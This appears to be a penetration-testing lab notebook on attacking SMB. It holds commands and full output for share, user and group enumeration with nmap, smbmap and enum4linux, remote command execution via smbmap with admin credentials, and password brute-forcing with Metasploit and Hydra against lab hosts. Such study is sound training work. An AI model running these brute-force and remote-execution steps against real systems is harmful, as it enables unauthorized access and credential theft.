# SMB

## nmap

Supported protocols

```bash
root@attackdefense:~# nmap -p 445 --script smb-protocols $target
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:00 IST
Nmap scan report for 10.4.25.145
Host is up (0.0084s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-protocols:
|   dialects:
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.02
|     2.10
|     3.00
|_    3.02

Nmap done: 1 IP address (1 host up) scanned in 6.48 seconds
```

Security Modes

```bash
root@attackdefense:~# nmap -p 445 --script smb-security-mode $target
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:01 IST
Nmap scan report for 10.4.25.145
Host is up (0.0086s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
```

Open Sessions

```bash
root@attackdefense:~# nmap -p 445 --script smb-enum-sessions $target
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:01 IST
Nmap scan report for 10.4.25.145
Host is up (0.0084s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-sessions:
|   Users logged in
|_    SMBSERVER\bob since <unknown>

Nmap done: 1 IP address (1 host up) scanned in 4.03 seconds
root@attackdefense:~# nmap -p 445 --script smb-enum-sessions $target --script-args smbusername=administrator,smbpassword=smbserver_771
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:01 IST
Nmap scan report for 10.4.25.145
Host is up (0.0084s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-sessions:
|   Users logged in
|     SMBSERVER\bob since 2024-01-16T13:07:11
|   Active SMB sessions
|_    ADMINISTRATOR is connected from \\10.10.80.2 for [just logged in, it's probably you], idle for [not idle]

Nmap done: 1 IP address (1 host up) scanned in 4.05 seconds
```

Shares

```bash
root@attackdefense:~# nmap -p 445 --script smb-enum-shares $target
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:04 IST
Nmap scan report for 10.4.25.145
Host is up (0.0082s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.4.25.145\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.4.25.145\C:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.4.25.145\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.4.25.145\D$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.4.25.145\Documents:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.4.25.145\Downloads:
|     Type: STYPE_DISKTREE
|     Comment:
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.4.25.145\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.4.25.145\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Anonymous access: <none>
|_    Current user access: READ

Nmap done: 1 IP address (1 host up) scanned in 45.93 seconds


root@attackdefense:~# nmap -p 445 --script smb-enum-shares $target --script-args smbusername=administrator,smbpassword=smbserver_771
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:06 IST
Nmap scan report for 10.4.25.145
Host is up (0.0082s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: administrator
|   \\10.4.25.145\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\Windows
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.4.25.145\C:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\
|     Anonymous access: <none>
|     Current user access: READ

```

Users

```bash
root@attackdefense:~# nmap -p 445 --script smb-enum-users $target --script-args smbusername=administrator,smbpassword=smbserver_771
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:09 IST
Nmap scan report for 10.4.25.145
Host is up (0.0080s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-users:
|   SMBSERVER\Administrator (RID: 500)
|     Description: Built-in account for administering the computer/domain
|     Flags:       Password does not expire, Normal user account
|   SMBSERVER\bob (RID: 1010)
|     Flags:       Password does not expire, Normal user account
|   SMBSERVER\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|_    Flags:       Password does not expire, Password not required, Normal user account

Nmap done: 1 IP address (1 host up) scanned in 4.71 seconds
```

Groups

```bash
root@attackdefense:~# nmap -p 445 --script smb-enum-groups $target --script-args smbusername=administrator,smbpassword=smbserver_771
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:12 IST
Nmap scan report for 10.4.25.145
Host is up (0.0080s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-groups:
|   Builtin\Administrators (RID: 544): Administrator, bob
|   Builtin\Users (RID: 545): bob
|   Builtin\Guests (RID: 546): Guest
|   Builtin\Power Users (RID: 547): <empty>
|   Builtin\Print Operators (RID: 550): <empty>
|   Builtin\Backup Operators (RID: 551): <empty>
|   Builtin\Replicator (RID: 552): <empty>
|   Builtin\Remote Desktop Users (RID: 555): bob
|   Builtin\Network Configuration Operators (RID: 556): <empty>
|   Builtin\Performance Monitor Users (RID: 558): <empty>
|   Builtin\Performance Log Users (RID: 559): <empty>
|   Builtin\Distributed COM Users (RID: 562): <empty>
|   Builtin\IIS_IUSRS (RID: 568): <empty>
|   Builtin\Cryptographic Operators (RID: 569): <empty>
|   Builtin\Event Log Readers (RID: 573): <empty>
|   Builtin\Certificate Service DCOM Access (RID: 574): <empty>
|   Builtin\RDS Remote Access Servers (RID: 575): <empty>
|   Builtin\RDS Endpoint Servers (RID: 576): <empty>
|   Builtin\RDS Management Servers (RID: 577): <empty>
|   Builtin\Hyper-V Administrators (RID: 578): <empty>
|   Builtin\Access Control Assistance Operators (RID: 579): <empty>
|   Builtin\Remote Management Users (RID: 580): <empty>
|_  SMBSERVER\WinRMRemoteWMIUsers__ (RID: 1000): <empty>

Nmap done: 1 IP address (1 host up) scanned in 4.15 seconds
```

Domains

```bash
root@attackdefense:~# nmap -p 445 --script smb-enum-domains $target --script-args smbusername=administrator,smbpassword=smbserver_771
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:10 IST
Nmap scan report for 10.4.25.145
Host is up (0.0080s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-domains:
|   SMBSERVER
|     Groups: WinRMRemoteWMIUsers__
|     Users: Administrator, bob, Guest
|     Creation time: 2013-08-22T14:47:57
|     Passwords: min length: n/a; min age: n/a days; max age: 42 days; history: n/a passwords
|     Properties: Complexity requirements exist
|     Account lockout disabled
|   Builtin
|     Groups: Access Control Assistance Operators, Administrators, Backup Operators, Certificate Service DCOM Access, Cryptographic Operators, Distributed COM Users, Event Log Readers, Guests, Hyper-V Administrators, IIS_IUSRS, Network Configuration Operators, Performance Log Users, Performance Monitor Users, Power Users, Print Operators, RDS Endpoint Servers, RDS Management Servers, RDS Remote Access Servers, Remote Desktop Users, Remote Management Users, Replicator, Users
|     Users: n/a
|     Creation time: 2013-08-22T14:47:57
|     Passwords: min length: n/a; min age: n/a days; max age: 42 days; history: n/a passwords
|_    Account lockout disabled

Nmap done: 1 IP address (1 host up) scanned in 3.98 seconds
```

Enum Shares and List their content

```bash
root@attackdefense:~# nmap -p 445 --script smb-enum-shares,smb-ls $target --script-args smbusername=administrator,smbpassword=smbserver_771
Starting Nmap 7.91 ( https://nmap.org ) at 2024-01-16 19:14 IST
Nmap scan report for 10.4.25.145
Host is up (0.0080s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: administrator
|   \\10.4.25.145\ADMIN$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\Windows
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.4.25.145\C:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.4.25.145\C$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.4.25.145\D$:
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Users: 0
|     Max Users: <unlimited>
|     Path: D:\
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.4.25.145\Documents:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\Users\Administrator\Documents
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.4.25.145\Downloads:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\Users\Administrator\Downloads
|     Anonymous access: <none>
|     Current user access: READ
|   \\10.4.25.145\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Users: 1
|     Max Users: <unlimited>
|     Path:
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.4.25.145\print$:
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\Windows\system32\spool\drivers
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
| smb-ls: Volume \\10.4.25.145\ADMIN$
|   maxfiles limit reached (10)
| SIZE   TIME                 FILENAME
| <DIR>  2013-08-22T13:36:16  .
| <DIR>  2013-08-22T13:36:16  ..
| <DIR>  2013-08-22T15:39:31  ADFS
| <DIR>  2013-08-22T15:39:31  ADFS\ar
| <DIR>  2013-08-22T15:39:31  ADFS\bg
| <DIR>  2013-08-22T15:39:31  ADFS\cs
| <DIR>  2013-08-22T15:39:31  ADFS\da
| <DIR>  2013-08-22T15:39:31  ADFS\de
| <DIR>  2013-08-22T15:39:31  ADFS\el
| <DIR>  2013-08-22T15:39:31  ADFS\en
|
|
| Volume \\10.4.25.145\C
|   maxfiles limit reached (10)
| SIZE   TIME                 FILENAME
| 32     2020-12-21T15:56:56  flag.txt
| <DIR>  2013-08-22T15:39:30  PerfLogs
| <DIR>  2013-08-22T13:36:16  Program Files
| <DIR>  2014-05-17T10:36:57  Program Files\Amazon
| <DIR>  2013-08-22T13:36:16  Program Files\Common Files
| <DIR>  2014-10-15T05:58:49  Program Files\DIFX
| <DIR>  2013-08-22T15:39:31  Program Files\Internet Explorer
| <DIR>  2014-07-10T18:40:15  Program Files\Update Services
| <DIR>  2020-08-12T04:13:47  Program Files\Windows Mail
| <DIR>  2013-08-22T15:39:31  Program Files\Windows NT
|
|
| Volume \\10.4.25.145\C$
|   maxfiles limit reached (10)
| SIZE   TIME                 FILENAME
| 32     2020-12-21T15:56:56  flag.txt
| <DIR>  2013-08-22T15:39:30  PerfLogs
| <DIR>  2013-08-22T13:36:16  Program Files
| <DIR>  2014-05-17T10:36:57  Program Files\Amazon
| <DIR>  2013-08-22T13:36:16  Program Files\Common Files
| <DIR>  2014-10-15T05:58:49  Program Files\DIFX
| <DIR>  2013-08-22T15:39:31  Program Files\Internet Explorer
| <DIR>  2014-07-10T18:40:15  Program Files\Update Services
| <DIR>  2020-08-12T04:13:47  Program Files\Windows Mail
| <DIR>  2013-08-22T15:39:31  Program Files\Windows NT
|
|
| Volume \\10.4.25.145\Documents
| SIZE   TIME                 FILENAME
| <DIR>  2020-09-10T09:50:27  .
| <DIR>  2020-09-10T09:50:27  ..
|
|
| Volume \\10.4.25.145\Downloads
| SIZE   TIME                 FILENAME
| <DIR>  2020-09-10T09:50:27  .
| <DIR>  2020-09-10T09:50:27  ..
|
|
| Volume \\10.4.25.145\print$
|   maxfiles limit reached (10)
| SIZE    TIME                 FILENAME
| <DIR>   2013-08-22T15:39:31  .
| <DIR>   2013-08-22T15:39:31  ..
| <DIR>   2013-08-22T15:39:31  color
| 1058    2013-08-22T06:54:44  color\D50.camp
| 1079    2013-08-22T06:54:44  color\D65.camp
| 797     2013-08-22T06:54:44  color\Graphics.gmmp
| 838     2013-08-22T06:54:44  color\MediaSim.gmmp
| 786     2013-08-22T06:54:44  color\Photo.gmmp
| 822     2013-08-22T06:54:44  color\Proofing.gmmp
| 218103  2013-08-22T06:54:44  color\RSWOP.icm
|_

Nmap done: 1 IP address (1 host up) scanned in 57.79 seconds
```

## smbmap

List Shares

```bash
root@attackdefense:~# smbmap -u guest -p "" -d . -H $target
[+] Guest session   	IP: 10.4.21.217:445	Name: 10.4.21.217
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C                                                 	NO ACCESS	
	C$                                                	NO ACCESS	Default share
	D$                                                	NO ACCESS	Default share
	Documents                                         	NO ACCESS	
	Downloads                                         	NO ACCESS	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ ONLY	Printer Drivers

root@attackdefense:~# smbmap -u administrator -p "smbserver_771" -d . -H $target
[+] IP: 10.4.21.217:445	Name: 10.4.21.217
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ, WRITE	Remote Admin
	C                                                 	READ ONLY	
	C$                                                	READ, WRITE	Default share
	D$                                                	READ, WRITE	Default share
	Documents                                         	READ ONLY	
	Downloads                                         	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	print$                                            	READ, WRITE	Printer Drivers
```

Run commands on the server

```bash
root@attackdefense:~# smbmap -u administrator -p "smbserver_771"  -H $target -x 'ipconfig'

Windows IP Configuration


Ethernet adapter Ethernet 3:

   Connection-specific DNS Suffix  . : ec2.internal
   Link-local IPv6 Address . . . . . : fe80::6154:ee6:33a7:38b2%22
   IPv4 Address. . . . . . . . . . . : 10.4.21.217
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 10.4.16.1

Tunnel adapter isatap.ec2.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ec2.internal

root@attackdefense:~# smbmap -u administrator -p "smbserver_771"  -H $target -x 'whoami'
smbserver\administrator
```

List Drives and their content

```bash
root@attackdefense:~# smbmap -u administrator -p "smbserver_771"  -H $target -L
[+] Host 10.4.21.217 Local Drives: C:\ D:\
[+] Host 10.4.21.217 Net Drive(s):
	No mapped network drives

root@attackdefense:~# smbmap -u administrator -p "smbserver_771"  -H $target -r 'C$'
[+] IP: 10.4.21.217:445	Name: 10.4.21.217
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	C$                                                	READ, WRITE	
	.\C$\*
	dr--r--r--                0 Sat Sep  5 13:26:00 2020	$Recycle.Bin
	fw--w--w--           398356 Wed Aug 12 10:47:41 2020	bootmgr
	fr--r--r--                1 Wed Aug 12 10:47:40 2020	BOOTNXT
	dr--r--r--                0 Wed Aug 12 10:47:41 2020	Documents and Settings
	fr--r--r--               32 Mon Dec 21 21:27:10 2020	flag.txt
	fr--r--r--       8589934592 Tue Jan 16 23:03:16 2024	pagefile.sys
	dr--r--r--                0 Wed Aug 12 10:49:32 2020	PerfLogs
	dw--w--w--                0 Wed Aug 12 10:49:32 2020	Program Files
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	Program Files (x86)
	dr--r--r--                0 Sat Sep  5 14:35:45 2020	ProgramData
	dr--r--r--                0 Sat Sep  5 09:16:57 2020	System Volume Information
	dw--w--w--                0 Sat Dec 19 11:14:55 2020	Users
	dr--r--r--                0 Tue Jan 16 23:06:55 2024	Windows
```

## enum4linux

```bash
root@attackdefense:~# enum4linux -o $target
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jan 16 23:33:48 2024

 ==========================
|    Target Information    |
 ==========================
Target ........... 192.254.94.3
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================
|    Enumerating Workgroup/Domain on 192.254.94.3    |
 ====================================================
[+] Got domain/workgroup name: RECONLABS

 =====================================
|    Session Check on 192.254.94.3    |
 =====================================
[+] Server 192.254.94.3 allows sessions using username '', password ''

 ===========================================
|    Getting domain SID for 192.254.94.3    |
 ===========================================
Domain Name: RECONLABS
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================
|    OS information on 192.254.94.3    |
 ======================================
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 192.254.94.3 from smbclient:
[+] Got OS info for 192.254.94.3 from srvinfo:
        SAMBA-RECON    Wk Sv PrQ Unx NT SNT samba.recon.lab
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03
enum4linux complete on Tue Jan 16 23:33:48 2024
```

## Brute Force Login
### Metasploit

```bash
msf5 > use auxiliary/scanner/smb/smb_login

msf5 auxiliary(scanner/smb/smb_login) > options

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target address range or CIDR identifier
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.47.147.3
RHOSTS => 192.47.147.3

msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt
PASS_FILE => /usr/share/wordlists/metasploit/unix_passwords.txt

msf5 auxiliary(scanner/smb/smb_login) > set SMBUSER jane
SMBUSER => jane

msf5 auxiliary(scanner/smb/smb_login) > exploit

[*] 192.47.147.3:445      - 192.47.147.3:445 - Starting SMB login bruteforce
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:admin',
[!] 192.47.147.3:445      - No active DB -- Credential data will not be saved!
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:123456',
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:12345',
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:123456789',
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:password',
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:iloveyou',
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:princess',
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:1234567',
[-] 192.47.147.3:445      - 192.47.147.3:445 - Failed: '.\jane:12345678',
[+] 192.47.147.3:445      - 192.47.147.3:445 - Success: '.\jane:abc123'
[*] 192.47.147.3:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_login) >
```

### Hydra

```bash
root@attackdefense:~# hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.47.147.3  smb
Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-17 00:08:46
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
[DATA] attacking smb://192.47.147.3:445/
[445][smb] host: 192.47.147.3   login: admin   password: password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-01-17 00:08:48
```

## SMB Pipe Auditor

```bash
msf5 > use auxiliary/scanner/smb/pipe_auditor
msf5 auxiliary(scanner/smb/pipe_auditor) > options

Module options (auxiliary/scanner/smb/pipe_auditor):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS                                                                       yes       The target address range or CIDR identifier
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads

msf5 auxiliary(scanner/smb/pipe_auditor) > set RHOSTS 192.47.147.3
RHOSTS => 192.47.147.3
msf5 auxiliary(scanner/smb/pipe_auditor) > set SMBUSER admin
SMBUSER => admin
msf5 auxiliary(scanner/smb/pipe_auditor) > set SMBPASS password1
SMBPASS => password1
msf5 auxiliary(scanner/smb/pipe_auditor) > run

[+] 192.47.147.3:139      - Pipes: \netlogon, \lsarpc, \samr, \eventlog, \InitShutdown, \ntsvcs, \srvsvc, \wkssvc
[*] 192.47.147.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```